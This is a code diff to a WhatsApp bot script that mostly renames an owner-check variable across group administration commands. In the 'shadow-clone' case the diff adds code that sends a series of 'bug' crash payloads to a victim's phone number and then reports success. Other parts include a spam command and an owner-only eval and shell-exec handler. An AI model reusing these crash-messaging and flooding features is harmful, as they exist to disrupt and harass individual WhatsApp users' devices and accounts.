-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
@@ -5266,7 +5654,7 @@ break
                 break
 
                 case "idgroup": case "groupid": {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 let getGroups = await AlyaBotInc.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
 let anu = groups.map((v) => v.id)
@@ -5338,7 +5726,7 @@ var inputnumber = text.split(" ")[0]
 break
 case 'getcontact': case 'getcon': {
 if (!m.isGroup) return AlyaStickGroup()
-if (!(isGroupAdmins || XeonTheCreator)) return AlyaStickAdmin()
+if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
 xeonbigpp = await AlyaBotInc.sendMessage(m.chat, {
     text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
 }, {quoted: m, ephemeralExpiration: 86400})
@@ -5348,7 +5736,7 @@ AlyaBotInc.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
 break
 case 'savecontact': case 'svcontact':{
 if (!m.isGroup) return AlyaStickGroup()
-if (!(isGroupAdmins || XeonTheCreator)) return AlyaStickAdmin()
+if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
 let cmiggc = await AlyaBotInc.groupMetadata(m.chat)
 let orgiggc = participants.map(a => a.id)
 vcard = ''
@@ -5378,7 +5766,7 @@ AlyaBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 8640
 break
 case 'contacttag': case 'contag':{
 if (!m.isGroup) return AlyaStickGroup()
-if (!(isGroupAdmins || XeonTheCreator)) return AlyaStickAdmin()
+if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
 if (!m.mentionedJid[0]) return replygcalya('\nUse like this\n Example:.contacttag @tag|name')
 let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
 let sngContact = {
@@ -5389,7 +5777,7 @@ AlyaBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map
 break
             case 'add':
                 if (!m.isGroup) return AlyaStickGroup()
-                if(!XeonTheCreator) return AlyaStickOwner()
+                if(!AlyaTheQueen) return AlyaStickOwner()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
@@ -5397,7 +5785,7 @@ break
                 break
             case 'promote':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
@@ -5405,7 +5793,7 @@ break
                 break
             case 'demote':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
@@ -5414,14 +5802,14 @@ break
             case 'setnamegc':
             case 'setsubject':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (!text) return replygcalya('Text ?')
                 await AlyaBotInc.groupUpdateSubject(m.chat, text)
                 replygcalya(mess.done)
                 break
                 case 'userjid':{
-          	if(!XeonTheCreator) return AlyaStickOwner()
+          	if(!AlyaTheQueen) return AlyaStickOwner()
         const groupMetadata = m.isGroup ? await AlyaBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
 		const participants = m.isGroup ? await groupMetadata.participants : ""
     let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
@@ -5432,7 +5820,7 @@ break
     }
     break
     case 'creategc': case 'creategroup': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!args.join(" ")) return replygcalya(`Use ${prefix+command} groupname`)
 try {
 let cret = await AlyaBotInc.groupCreate(args.join(" "), [])
@@ -5451,7 +5839,7 @@ AlyaBotInc.sendMessage(m.chat, { text:teksop, mentions: await AlyaBotInc.parseMe
 }
 break
     case 'setbotbio':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!text) return replygcalya(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
     await AlyaBotInc.updateProfileStatus(text)
     replygcalya(`Success in changing the bio of bot's number`)
@@ -5459,13 +5847,13 @@ if (!text) return replygcalya(`Where is the text?\nExample: ${prefix + command} 
     break
     case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
 if (!m.isGroup) return AlyaStickGroup()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
 if (!isBotAdmins) return AlyaStickBotAdmin()
     await AlyaBotInc.removeProfilePicture(from)
     }
     break
     case 'deleteppbot': case 'delppbot': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
     await AlyaBotInc.removeProfilePicture(AlyaBotInc.user.id)
     replygcalya(`Success in deleting bot's profile picture`)
     }
@@ -5473,7 +5861,7 @@ if (!XeonTheCreator) return AlyaStickOwner()
             case 'setdesc':
             case 'setdesk':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (!text) return replygcalya('Text ?')
                 await AlyaBotInc.groupUpdateDescription(m.chat, text)
@@ -5524,7 +5912,7 @@ if (!XeonTheCreator) return AlyaStickOwner()
             case 'tagall':
             case 'tag':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let me = m.sender
                 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
@@ -5540,7 +5928,7 @@ if (!XeonTheCreator) return AlyaStickOwner()
             break
             case 'kickall': {
  if (!m.isGroup) return AlyaStickGroup()
- if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+ if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
   const xeonkickall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
@@ -5563,7 +5951,7 @@ if (!XeonTheCreator) return AlyaStickOwner()
 break
 case 'promoteall': {
  if (!m.isGroup) return AlyaStickGroup()
- if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+ if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
   const xeonpromoteall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
@@ -5583,7 +5971,7 @@ case 'promoteall': {
 break
 case 'demoteall': {
  if (!m.isGroup) return AlyaStickGroup()
- if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+ if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
   const xeondemoteall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
@@ -5603,7 +5991,7 @@ case 'demoteall': {
 break
             case 'hidetag':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 AlyaBotInc.sendMessage(m.chat, {
                     text: q ? q : '',
@@ -5625,7 +6013,7 @@ break
             case 'group':
             case 'grup':{
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (args[0] === 'close') {
                     await AlyaBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcalya(`Success Closing Group`))
@@ -5697,7 +6085,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'editinfo':{
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (args[0] === 'open') {
                     await AlyaBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcalya(`Successfully Opened Edit Group Info`))
@@ -5774,7 +6162,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'grouplink':
             case 'gruplink':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 let response = await AlyaBotInc.groupInviteCode(m.chat)
                 AlyaBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
@@ -5941,7 +6329,7 @@ break
             case 'revoke':
             case 'resetlink':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 await AlyaBotInc.groupRevokeInvite(m.chat)
                     .then(res => {
@@ -6738,7 +7126,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
     case 'autoswview':
     case 'autostatusview':{
-             if (!XeonTheCreator) return AlyaStickOwner()
+             if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (args[0] === 'on') {
                   antiswview = true
@@ -6811,7 +7199,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
     case 'anticall': {
-             if (!XeonTheCreator) return AlyaStickOwner()
+             if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (args[0] === 'on') {
                   anticall = true
@@ -6885,7 +7273,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
              break
 case 'addvideo':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Whats the video name?')
 if (VideoXeon.includes(q)) return replygcalya("The name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
@@ -6897,7 +7285,7 @@ replygcalya(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
 }
 break
 case 'delvideo':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the video name')
 if (!VideoXeon.includes(q)) return replygcalya("The name does not exist in the database")
 let wanu = VideoXeon.indexOf(q)
@@ -6917,7 +7305,7 @@ replygcalya(teks)
 }
 break
 case 'addimage':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Whats the image name?')
 if (ImageXeon.includes(q)) return replygcalya("The name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
@@ -6929,7 +7317,7 @@ replygcalya(`Success Adding Image\nCheck by typing ${prefix}listimage`)
 }
 break
 case 'delimage':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the image name')
 if (!ImageXeon.includes(q)) return replygcalya("The name does not exist in the database")
 let wanu = ImageXeon.indexOf(q)
@@ -6949,7 +7337,7 @@ replygcalya(teks)
 }
 break
 case 'addsticker':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Whats the sticker name?')
 if (StickerXeon.includes(q)) return replygcalya("The name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
@@ -6961,7 +7349,7 @@ replygcalya(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
 }
 break
 case 'delsticker':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the sticker name')
 if (!StickerXeon.includes(q)) return replygcalya("The name does not exist in the database")
 let wanu = StickerXeon.indexOf(q)
@@ -6981,7 +7369,7 @@ replygcalya(teks)
 }
 break
 case 'addmsg': {
-	if (!XeonTheCreator) return AlyaStickOwner()
+	if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!m.quoted) return replygcalya('Reply Message You Want To Save In Database')
                 if (!text) return replygcalya(`Example : ${prefix + command} filename`)
                 let msgs = global.db.data.database
@@ -7012,7 +7400,7 @@ View list of Messages With ${prefix}listmsg`)
 	    }
 	    break 
 	case 'delmsg': case 'deletemsg': {
-		if (!XeonTheCreator) return AlyaStickOwner()
+		if (!AlyaTheQueen) return AlyaStickOwner()
 	        let msgs = global.db.data.database
 	        if (!(text.toLowerCase() in msgs)) return replygcalya(`'${text}' not listed in the message list`)
 		delete msgs[text.toLowerCase()]
@@ -7020,7 +7408,7 @@ View list of Messages With ${prefix}listmsg`)
             }
 	    break
 case 'addvn':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Whats the audio name?')
 if (VoiceNoteXeon.includes(q)) return replygcalya("The name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
@@ -7032,7 +7420,7 @@ replygcalya(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
 }
 break
 case 'delvn':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the vn name')
 if (!VoiceNoteXeon.includes(q)) return replygcalya("The name does not exist in the database")
 let wanu = VoiceNoteXeon.indexOf(q)
@@ -7052,7 +7440,7 @@ replygcalya(teks)
 }
 break
 case 'addzip':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya(`What's the zip name?`)
 let teks = `${text}`
@@ -7068,7 +7456,7 @@ replygcalya(`Success Adding zip\nTo check type ${prefix}listzip`)
 }
 break
 case 'delzip':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya('Enter the text in the zip list')
 let teks = `${text}`
@@ -7093,7 +7481,7 @@ replygcalya(teksooooo)
 }
 break
 case 'addapk':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya('What is the name of the apk?')
 let teks = `${text}`
@@ -7109,7 +7497,7 @@ replygcalya(`Successful Adding apk\nTo Check type ${prefix}listapk`)
 }
 break
 case 'delapk':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya('Name of the apk?')
 let teks = `${text}`
@@ -7134,7 +7522,7 @@ replygcalya(teksoooooo)
 }
 break
 case 'addpdf':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya('What is the name of the pdf')
 let teks = `${text}`
@@ -7150,7 +7538,7 @@ replygcalya(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
 }
 break
 case 'delpdf':{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 
 if (args.length < 1) return replygcalya('Enter the name')
 let teks = `${text}`
@@ -15989,7 +16377,7 @@ ${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index +
             }
             break 
 case 'lockcmd': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!m.quoted) return replygcalya('Reply Message!')
                 if (!m.quoted.fileSha256) return replygcalya('SHA256 Hash Missing')
                 let hash = m.quoted.fileSha256.toString('base64')
@@ -16407,7 +16795,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 }
 break
 case 'addlist':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!m.isGroup) return AlyaStickGroup()
 var args1 = text.split("@")[0]
 var args2 = text.split("@")[1]
@@ -16962,7 +17350,7 @@ await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 }
 break
 case 'spam':
-				if (!XeonTheCreator) return AlyaStickOwner()
+				if (!AlyaTheQueen) return AlyaStickOwner()
 					if (!text) return replygcalya(`Use ${prefix +command} text|amount`)
 				xeonarg = text.split("|")
 				if (!xeonarg) return replygcalya(`Use ${prefix+ command} text|amount`)
@@ -16979,24 +17367,24 @@ const simi2 = simi.result
 AlyaBotInc.sendMessage(m.chat, {text: simi2}, {quoted: m})
 break
 case 'clearall': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 AlyaBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
 break
 case 'pinchat': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (m.isGroup) return AlyaStickPrivate()
 AlyaBotInc.chatModify({ pin: true }, m.chat)
 }
 break
 case 'unpinchat': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (m.isGroup) return AlyaStickPrivate()
 AlyaBotInc.chatModify({ pin: false }, m.chat)
 }
 break
 case 'database': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 totalreg = Object.keys(global.db.data.users).length
     let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
     replygcalya(`*${totalreg} users using Bot*`)
@@ -17005,7 +17393,7 @@ break
 case 'getjoinrequest':{
 	if (!m.isGroup) return AlyaStickGroup()
 	if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
 	const response = await AlyaBotInc.groupRequestParticipantsList(m.chat);
   if (!response || !response.length) {
     AlyaBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
@@ -27069,19 +27457,23 @@ await sleep(3000)
 }
 replygcalya(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 break
-case 'shadow-clone':
-if (!isPremium) return replygcalya(mess.prem)
-if (!args[0] || !args[1]) return replygcalya(`Use ${prefix+command} number amount\nExample ${prefix+command} 2349123721026 5`)
-let targetNumber = args[0] // Get the target number
-let amount = parseInt(args[1]) || 10 // Default to 10 if no amount is specified
-
-for (let i = 0; i < amount; i++) {
-    let randomNumber = Math.floor(Math.random() * 10000000000); // Generate random 10-digit number
-    AlyaCrashy(randomNumber, targetNumber) // Send message with random number to the target number
-    await sleep(3000)
+case 'shadow-clone': {
+if (!AlyaTheQueen) return
+if (!q) return replygcalya(`Usage .${command} 2348100835767`)
+let alyavictim = q.replace(/[^0-9]/g, "")
+if (alyavictim.startsWith('0')) return replygcalya(`Example : .${command} 2348100835767`)
+let target = alyavictim + '@s.whatsapp.net'
+await replygcalya(`In process....`)
+for (let j = 0; j < 1; j++) {
+await listxeonfck(target, oneclickalya)
+await locationalya(target, force)
+await alyakillpic(target, oneclickalya)
+await locationalya(target, force)
+await blackening(target, force2)
+await locationalya(target, force)
 }
-
-replygcalya(`*Successfully sent bugs using ${amount} random numbers to ${targetNumber}. Please pause for 3 minutes*`)
+await replygcalya(`Successfully Send Bug to ${alyavictim} Using ${command}. ✅`)
+}
 break
 case 'amountbug': {
 if (!isPremium) return replygcalya(mess.premium)
@@ -27950,7 +28342,7 @@ break
 
             default:
                 if (budy.startsWith('=>')) {
-                    if (!XeonTheCreator) return AlyaStickOwner()
+                    if (!AlyaTheQueen) return AlyaStickOwner()
                     function Return(sul) {
                         sat = JSON.stringify(sul, null, 2)
                         bang = util.format(sat)
@@ -27967,7 +28359,7 @@ break
                 }
 
                 if (budy.startsWith('>')) {
-                    if (!XeonTheCreator) return AlyaStickOwner()
+                    if (!AlyaTheQueen) return AlyaStickOwner()
                     try {
                         let evaled = await eval(budy.slice(2))
                         if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -27977,7 +28369,7 @@ break
                     }
                 }
                 if (budy.startsWith('$')) {
-                    if (!XeonTheCreator) return AlyaStickOwner()
+                    if (!AlyaTheQueen) return AlyaStickOwner()
                     exec(budy.slice(2), (err, stdout) => {
                         if (err) return replygcalya(err)
                         if (stdout) return replygcalya(stdout)
